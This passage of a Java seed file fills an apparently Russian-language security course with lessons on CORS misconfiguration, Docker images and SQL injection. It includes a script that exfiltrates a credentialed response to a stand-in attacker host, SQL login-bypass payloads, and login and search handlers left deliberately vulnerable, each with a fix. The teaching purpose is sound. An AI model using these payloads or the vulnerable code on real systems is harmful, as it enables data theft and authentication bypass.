                        Атакующий размещает страницу на своем origin и делает запрос к уязвимому приложению:

                        ```html
                        <script>
                        fetch('https://target.local/api/me', { credentials: 'include' })
                          .then(response => response.text())
                          .then(body => fetch('https://attacker.local/log', {
                            method: 'POST',
                            body
                          }));
                        </script>
                        ```

                        В учебном lab вместо реальной эксфильтрации используйте локальный endpoint и тестовые данные.
                        Цель задания - доказать, что браузер разрешает чтение ответа с cookie пользователя.

                        ## ACAO wildcard

                        `Access-Control-Allow-Origin: *` сам по себе не разрешает credentialed requests. Браузер
                        заблокирует чтение ответа, если одновременно указан `Access-Control-Allow-Credentials: true`.
                        Но wildcard все равно опасен для публичных API, если ответ содержит данные, которые не должны
                        читаться любым сайтом.

                        ## Null origin

                        Некоторые приложения доверяют `Origin: null`, который может появляться у sandboxed documents,
                        локальных файлов или отдельных browser contexts. Если backend добавляет `null` в allowlist
                        без анализа сценария, это может стать обходом доверенной модели.

                        ## Regex allowlist mistakes

                        Частая ошибка - проверять origin через `endsWith('trusted.com')`. Тогда
                        `https://eviltrusted.com` может пройти проверку. Другая ошибка - доверять любому subdomain,
                        хотя часть subdomains контролируется пользователями или внешними сервисами.

                        ## Testing checklist

                        - отправьте запрос с `Origin: https://attacker.local`;
                        - проверьте, отражается ли origin в `Access-Control-Allow-Origin`;
                        - проверьте наличие `Access-Control-Allow-Credentials: true`;
                        - сравните ответы для trusted, untrusted и `null` origin;
                        - проверьте endpoints с персональными данными, токенами и настройками профиля;
                        - не тестируйте реальные домены и не отправляйте чувствительные данные наружу.

                        ## How to prevent

                        Используйте строгий allowlist конкретных origins. Не отражайте `Origin` автоматически.
                        Не включайте credentials для endpoints, которым это не нужно. Разделяйте публичные API и
                        персональные API, добавляйте `Vary: Origin`, покрывайте CORS policy тестами и проверяйте
                        subdomain ownership перед добавлением домена в allowlist.

                        ## Safe implementation

                        ```javascript
                        const allowedOrigins = new Set([
                          'https://pep.local',
                          'https://teacher.pep.local'
                        ]);

                        app.use((req, res, next) => {
                          const origin = req.headers.origin;
                          if (origin && allowedOrigins.has(origin)) {
                            res.setHeader('Access-Control-Allow-Origin', origin);
                            res.setHeader('Access-Control-Allow-Credentials', 'true');
                            res.setHeader('Vary', 'Origin');
                          }
                          next();
                        });
                        ```

                        ## What to report

                        В отчете покажите HTTP-запрос с вредоносным `Origin`, ответ сервера с CORS-заголовками,
                        endpoint с чувствительными данными, объяснение роли браузера и исправленную allowlist-политику.
                        """);
    }

    private LearningModule ensureModule(
            CourseRepository courses,
            LearningModuleRepository modules,
            String courseTitle,
            String courseDescription,
            String moduleTitle,
            String vulnerabilityTopic) {
        Course course = courses.findByTitle(courseTitle)
                .map(existing -> {
                    existing.updateDetails(courseDescription, CourseStatus.PUBLISHED);
                    return courses.save(existing);
                })
                .orElseGet(() -> courses.save(new Course(courseTitle, courseDescription, CourseStatus.PUBLISHED)));
        return modules.findByCourseIdAndTitle(course.getId(), moduleTitle)
                .orElseGet(() -> modules.save(new LearningModule(course, moduleTitle, vulnerabilityTopic, ModuleStatus.ACTIVE)));
    }

    private void seedDockerLessons(LessonRepository lessons, LearningModule module) {
        if (lessons.existsByModuleId(module.getId())) {
            return;
        }
        lessons.save(new Lesson(
                module,
                "Контейнеры и образы",
                """
                        ## Цель урока

                        Понять, зачем нужна контейнеризация и чем Docker image отличается от running container.

                        ## Ключевые идеи

                        - image - неизменяемый шаблон приложения;
                        - container - запущенный процесс на основе image;
                        - registry хранит и раздает images;
                        - logs помогают диагностировать запуск приложения.

                        ## Практика

                        ```bash
                        docker run hello-world
                        docker run --rm -p 8081:80 nginx:alpine
                        docker logs <container-id>
                        ```
                        """,
                1));
        lessons.save(new Lesson(
                module,
                "Основы Dockerfile",
                """
                        ## Цель урока

                        Научиться описывать приложение как Docker image с воспроизводимым запуском.

                        ## Минимальный Dockerfile

                        ```dockerfile
                        FROM node:22-alpine
                        WORKDIR /app
                        COPY app.js .
                        EXPOSE 8080
                        CMD ["node", "app.js"]
                        ```

                        ## Checklist

                        - есть понятный `FROM`;
                        - приложение слушает документированный port;
                        - запуск происходит одной командой `docker run`.
                        """,
                2));
        lessons.save(new Lesson(
                module,
                "Публикация image в registry",
                """
                        ## Цель урока

                        Подготовить image reference, который можно отправить на платформу.

                        ## Команды для demo registry

                        ```bash
                        docker build -t vulnerable-sqli-demo:latest ./examples/vulnerable-sqli-demo
                        docker tag vulnerable-sqli-demo:latest localhost:5001/vulnerable-sqli-demo:latest
                        docker push localhost:5001/vulnerable-sqli-demo:latest
                        ```

                        ## Важно

                        В MVP платформа не собирает исходный код студента. Студент отправляет только готовый
                        Docker image reference, application port и health path.
                        """,
                3));
    }

    private void seedInjectionLessons(LessonRepository lessons, LearningModule module) {
        upsertLesson(lessons, module, 1,
                "Docker image для сдачи на платформе",
                """
                        ## Цель урока

                        Научиться готовить приложение как Docker image, который можно отправить на technical validation.

                        ## Минимальные требования

                        - image запускается без ручных действий;
                        - приложение слушает документированный port `8080`;
                        - endpoint `/health` возвращает успешный ответ;
                        - не используется `--privileged`, host network и реальные секреты.

                        ## Команды

                        ```bash
                        docker build -t vulnerable-sqli-demo:latest ./examples/vulnerable-sqli-demo
                        docker tag vulnerable-sqli-demo:latest localhost:5001/vulnerable-sqli-demo:latest
                        docker push localhost:5001/vulnerable-sqli-demo:latest
                        ```
                        """);
        upsertLesson(lessons, module, 2,
                "A03. Injection: теория и признаки",
                """
                        ## Что такое SQL Injection

                        SQL Injection возникает, когда пользовательский ввод встраивается в SQL-команду как часть
                        синтаксиса, а не передается как параметр. В PortSwigger Web Security Academy эта тема обычно
                        разбирается через boolean-based, error-based, UNION и blind-подходы; в PEP мы используем
                        безопасный учебный scope и собственные Docker labs.

                        ## Почему инъекция работает

                        SQL-запрос состоит из структуры и данных. Структура задает таблицы, условия, сортировку,
                        объединения и подзапросы. Данные должны попадать в заранее подготовленные места. Уязвимость
                        появляется, когда ввод пользователя становится частью структуры запроса: закрывает строковый
                        литерал, добавляет оператор `OR`, комментирует остаток запроса или подставляет новый SQL-фрагмент.

                        ## Где обычно появляется уязвимость

                        - формы входа и восстановления пароля;
                        - поиск по каталогу, фильтры и сортировка;
                        - страницы деталей по `id`;
                        - admin-панели с экспортом CSV или отчетами;
                        - GraphQL/REST endpoints, где параметры напрямую попадают в query builder;
                        - legacy-код, где SQL собирается через string concatenation.

                        ## Признаки

                        - разные ответы на истинное и ложное условие;
                        - SQL error при одиночной кавычке;
                        - изменение количества записей при изменении `WHERE`;
                        - задержки ответа при time-based payloads в контролируемом lab.

                        ## Базовая методика проверки

                        Начинайте с безопасных, минимальных проверок. Не используйте destructive payloads, не меняйте
                        данные и не выходите за границы назначенного lab. Для учебного black box сценария достаточно
                        сравнить реакцию приложения на несколько вариантов одного параметра.

                        ```text
                        исходный запрос:       /products?category=books
                        проверка кавычки:      /products?category=books'
                        истинное условие:      /products?category=books' OR '1'='1
                        ложное условие:        /products?category=books' AND '1'='2
                        ```

                        Если истинное условие возвращает обычный или расширенный результат, а ложное резко меняет
                        ответ, это сильный индикатор boolean-based SQL Injection.

                        ## Boolean-based подход

                        Boolean-based SQL Injection полезна, когда приложение не показывает SQL-ошибку. Тестер меняет
                        условие так, чтобы база вернула разные результаты для true и false. В отчете нужно показать
                        пару запросов, различие ответа и объяснить, какая часть payload изменила SQL-логику.

                        ## Error-based подход

                        Error-based подход опирается на сообщения базы данных. В production такие ошибки не должны
                        попадать пользователю, но в учебном lab они помогают понять тип СУБД и место, где ввод попал
                        в SQL. В отчете фиксируйте только нейтральный фрагмент ошибки, без реальных секретов.

                        ## UNION-based подход

                        UNION используется для объединения результата исходного запроса с контролируемым результатом.
                        В учебной среде цель не в извлечении чужих данных, а в доказательстве, что структура запроса
                        контролируется вводом. Для PEP достаточно показать, что дополнительное значение появляется
                        в ответе приложения.

                        ## Как оформить evidence

                        Хороший отчет показывает цепочку: endpoint, исходный параметр, payload, различие результата,
                        уязвимый фрагмент кода и безопасное исправление. Скриншот без объяснения не считается
                        полноценным evidence, потому что куратор должен понимать корневую причину.

                        ## How to prevent

                        Основная защита - parameterized queries. Значения пользователя должны передаваться отдельно
                        от SQL-шаблона. Для динамической сортировки используйте allowlist имен колонок, а не подстановку
                        произвольной строки. Пароли храните как hash и проверяйте отдельно от SQL-условия.
                        """);
        upsertLesson(lessons, module, 3,
                "Уязвимый код: SQL Injection",
                """
                        ## Уязвимый пример

                        ```javascript
                        app.post('/login', async (req, res) => {
                          const sql = `
                            SELECT id, email
                            FROM users
                            WHERE email = '${req.body.email}'
                              AND password = '${req.body.password}'
                          `;
                          const user = await db.get(sql);
                          if (!user) return res.status(403).send('Неверный логин или пароль');
                          res.json(user);
                        });
                        ```

                        ## Разбор по строкам

                        В строках с `WHERE email = '${req.body.email}'` и `password = '${req.body.password}'`
                        пользовательский ввод попадает внутрь SQL без параметризации. Backend не передает значения
                        как данные, а склеивает итоговый текст запроса. Поэтому payload может закрыть кавычку,
                        добавить собственное условие и изменить смысл `WHERE`.

                        ```javascript
                        const sql = `
                          SELECT id, email
                          FROM users
                          WHERE email = '${req.body.email}'
                            AND password = '${req.body.password}'
                        `;
                        ```

                        Если пользователь отправит email `admin@local.host' --`, остаток условия с паролем может быть
                        закомментирован. Если отправит `' OR '1'='1`, условие может стать истинным для первой записи.

                        Payload для демонстрации:

                        ```text
                        ' OR '1'='1
                        ```

                        ## Как меняется SQL

                        До payload приложение ожидает такой запрос:

                        ```sql
                        SELECT id, email
                        FROM users
                        WHERE email = 'student@local.host'
                          AND password = 'student'
                        ```

                        После payload структура запроса меняется:

                        ```sql
                        SELECT id, email
                        FROM users
                        WHERE email = '' OR '1'='1'
                          AND password = 'anything'
                        ```

                        В зависимости от приоритета операторов и конкретного payload атакующий может обойти проверку
                        или изменить выборку. Это доказывает, что ввод управляет SQL-логикой.

                        ## Почему это уязвимо

                        Payload закрывает строковый литерал и добавляет собственное условие. Запрос начинает выполнять
                        логику атакующего, а не только поиск пользователя.

                        ## Вариант уязвимости в search endpoint

                        ```javascript
                        app.get('/products', async (req, res) => {
                          const query = req.query.q ?? '';
                          const rows = await db.all(
                            `SELECT id, title, price FROM products WHERE title LIKE '%${query}%'`
                          );
                          res.json(rows);
                        });
                        ```

                        Здесь проблема такая же: параметр `q` находится внутри SQL-текста. Payload может закрыть
                        шаблон `LIKE`, добавить `UNION SELECT` или изменить условие фильтрации. Даже если endpoint
                        не связан с авторизацией, impact может затрагивать конфиденциальность каталога и внутренних
                        данных.

                        ## Неполное исправление

                        Простая замена кавычек или regex-фильтр не является надежной защитой. У разных СУБД есть
                        разные варианты escaping, encoding и комментариев. Такие фильтры часто ломаются при смене
                        контекста: строка, число, `LIKE`, `ORDER BY`, JSON operator.

                        ## Безопасное исправление

                        ```javascript
                        const user = await db.get(
                          'SELECT id, email FROM users WHERE email = ? AND password_hash = ?',
                          [req.body.email, passwordHash]
                        );
                        ```

                        Используйте parameterized queries, ORM bindings и отдельную безопасную проверку пароля.

                        ## Безопасная сортировка через allowlist

                        Параметризовать имя колонки нельзя так же, как значение. Для `ORDER BY` используйте allowlist:

                        ```javascript
                        const sortColumns = {
                          title: 'title',
                          price: 'price',
                          createdAt: 'created_at'
                        };
                        const sortColumn = sortColumns[req.query.sort] ?? 'title';
                        const rows = await db.all(
                          `SELECT id, title, price FROM products ORDER BY ${sortColumn} ASC`
                        );
                        ```

                        Здесь пользователь выбирает только ключ из заранее заданного списка, а не произвольный SQL.

                        ## What to report

                        В отчете PEP укажите endpoint, payload, изменившийся SQL-смысл, скриншот или HTTP-ответ,
                        уязвимый фрагмент кода и исправленную версию с параметризованным запросом.
                        """);
        upsertLesson(lessons, module, 4,
                "White box lab: A03. Injection",
                """
                        ## Задание

                        Создайте учебное приложение с одним намеренно уязвимым SQL endpoint. Подходящие варианты:

                        - `/login` с конкатенацией SQL;
                        - `/products?search=` с unsafe search query;
                        - `/orders?sort=` с unsafe ORDER BY.

                        ## Что приложить в отчет

                        - endpoint;
                        - payload;
                        - evidence успешной эксплуатации;
                        - уязвимый участок кода;
                        - рекомендацию использовать parameterized queries.
                        """);
        upsertLesson(lessons, module, 5,
                "Black box чеклист для A03. Injection",
                """
                        ## Чеклист

                        - найти формы ввода и query parameters;
                        - проверить признаки boolean-based injection;
                        - сравнить ответы на истинное и ложное условие;
                        - проверить search, sort, filter и login flows;
                        - не выполнять DoS и не выходить за scope назначенного lab;
                        - зафиксировать только минимальное evidence;
                        - оформить impact и рекомендацию по исправлению.
                        """);
    }

    private void seedGenericOwaspLessons(LessonRepository lessons, LearningModule module, OwaspModuleSeed seed) {
        upsertLesson(lessons, module, 1,
                seed.title() + ": теория и признаки",
                """
                        ## Ориентир курса

                        Материал подготовлен как русскоязычное учебное изложение по мотивам тем PortSwigger
                        Web Security Academy. Текст и задания адаптированы для PEP: студент создает собственный
                        Docker lab, доказывает уязвимость white box отчетом и затем проверяет чужие labs black box.

                        ## Суть уязвимости

                        %s.

                        ## Модель угроз

                        При анализе этой темы важно ответить на три вопроса: какие данные или действия защищает
                        приложение, какой ввод контролирует пользователь и где проходит trust boundary. Уязвимость
                        появляется не только в одном handler, а в связке маршрута, middleware, бизнес-правила и
                        хранения состояния.

                        ## Где искать

                        - HTTP endpoints, где решение зависит от пользовательского ввода;
                        - middleware, security filters, обработчики ошибок и фоновые jobs;
                        - места, где приложение доверяет client-side данным, URL, headers, cookies или metadata.

                        ## Как читать уязвимый код

                        Сначала найдите источник данных: `req.params`, `req.query`, `req.body`, headers, cookies,
                        uploaded files или данные из очереди. Затем проследите, где эти данные используются:
                        в SQL, HTML, URL, файловом пути, проверке роли, криптографии или server-side request. Если
                        между источником и опасным действием нет явной проверки инварианта, это кандидат на finding.

                        ## Black box признаки

                        Без доступа к коду ищите расхождения в поведении: разные статусы ответа, отличающиеся поля
                        JSON, сообщения ошибок, изменение времени ответа, доступ к данным другого пользователя или
                        возможность выполнить действие в неправильном состоянии workflow.

                        ## Минимальный impact

                        Для учебного отчета достаточно показать контролируемое нарушение свойства безопасности:
                        доступ, целостность, конфиденциальность, аудитируемость или границу trust boundary.

                        ## How to prevent

                        Исправление должно закрывать корневую причину. Добавьте server-side policy, строгую валидацию
                        контекста, безопасные API фреймворка, аудит важных событий и автоматические тесты на негативные
                        сценарии. Не ограничивайтесь скрытием кнопки во фронтенде или косметической фильтрацией строки.
                        """.formatted(seed.theoryFocus()));
        upsertLesson(lessons, module, 2,
                "Уязвимый код: " + seed.title(),
                """
                        ## Уязвимый пример

                        Ниже пример кода, который намеренно содержит уязвимость по теме `%s`.
                        Используйте его как идею для собственного lab, но не копируйте в production.

                        ```javascript
                        %s
                        ```

                        ## Разбор примера

                        В этом фрагменте есть типичный анти-паттерн: backend принимает пользовательский ввод или
                        client-side состояние и сразу использует его в чувствительном действии. Для white box отчета
                        важно не просто показать payload, а объяснить, какая проверка отсутствует и какой инвариант
                        нарушается.

                        ## Почему это уязвимо

                        %s

                        ## Как воспроизвести в lab

                        Создайте минимальные тестовые данные и один endpoint, где уязвимость видна без доступа к
                        реальным секретам. Затем выполните нормальный запрос и запрос с измененным параметром.
                        Сравните результат: доступ к чужому объекту, изменение состояния, утечка поля, bypass шага
                        workflow или отсутствие security event.

                        ## Что считается хорошим evidence

                        - исходный HTTP-запрос;
                        - payload или измененный параметр;
                        - наблюдаемый результат;
                        - фрагмент кода, где отсутствует проверка;
                        - объяснение impact в рамках учебного lab.

                        ## Безопасное направление исправления

                        %s

                        ## Regression test

                        После исправления добавьте негативный тест: тот же payload или последовательность действий
                        должны возвращать отказ, нейтральную ошибку или пустой результат. Тест должен проверять именно
                        security boundary, а не только успешный happy path.
                        """.formatted(seed.title(), seed.vulnerableCode(), seed.vulnerabilityReason(), seed.safeFix()));
        upsertLesson(lessons, module, 3,
                "White box lab: " + seed.title(),
                """
                        ## Задание

                        %s.

                        ## Что должно быть в приложении

                        - Docker image, который запускается без ручных действий;
                        - `/health`, возвращающий успешный ответ;
                        - один endpoint или workflow с уязвимостью `%s`;
                        - тестовые данные, достаточные для воспроизведения;
                        - безопасный scope без реальных секретов и внешних целей.

                        ## Что приложить в отчет

                        - уязвимый фрагмент кода;
                        - шаги воспроизведения;
                        - payload или последовательность действий;
                        - evidence результата;
                        - объяснение, почему исправление устраняет корень проблемы.
                        """.formatted(seed.whiteBoxTask(), seed.title()));
        upsertLesson(lessons, module, 4,
                "Black box чеклист: " + seed.title(),
                """
                        ## Чеклист тестирования

                        %s.

                        ## Правила отчета

                        - проверяйте только назначенный lab;
                        - сохраняйте payloads и HTTP-запросы в минимальном виде;
                        - отделяйте подтвержденные находки от гипотез;
                        - оценивайте impact через доступ, данные, целостность и воспроизводимость;
                        - предлагайте исправление, которое устраняет причину, а не только симптом.
                        """.formatted(seed.blackBoxChecklist()));
    }

    private void upsertLesson(
            LessonRepository lessons,
            LearningModule module,
            int position,
            String title,
            String contentMarkdown) {
        Map<Integer, Lesson> byPosition = lessons.findByModuleIdOrderByPositionAsc(module.getId()).stream()
                .collect(Collectors.toMap(Lesson::getPosition, Function.identity(), (left, right) -> left));
        Lesson existing = byPosition.get(position);
        if (existing == null) {
            lessons.save(new Lesson(module, title, contentMarkdown, position));
        } else {
            existing.updateContent(title, contentMarkdown, position);
            lessons.save(existing);
        }
    }

    private record OwaspModuleSeed(
            String title,
            String topic,
            String theoryFocus,
            String whiteBoxTask,
            String blackBoxChecklist,
            String vulnerableCode,
            String vulnerabilityReason,
            String safeFix) {
    }

    private record SecurityModuleSeed(
            String title,
            String topic,
            String definition,
            String searchAreas,
            String vulnerableCode,
            String codeExplanation,
            String safeCode,
            String defense,
            String payloads) {
    }

    private void createUser(
            AppUserRepository users,
            PasswordEncoder passwordEncoder,
            String email,
            String rawPassword,
            String displayName,
            Role role) {
        if (!users.existsByEmail(email)) {
            users.save(new AppUser(email, passwordEncoder.encode(rawPassword), displayName, role));
        }
    }
}
